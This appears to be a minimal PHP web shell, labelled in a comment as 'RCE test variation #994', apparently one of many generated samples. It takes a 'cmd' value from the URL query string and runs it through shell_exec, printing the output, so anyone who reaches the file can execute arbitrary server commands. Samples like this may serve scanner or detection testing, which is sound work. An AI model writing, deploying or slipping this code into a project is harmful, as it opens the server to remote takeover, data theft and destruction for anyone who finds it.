<?php
// RCE test variation #994
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>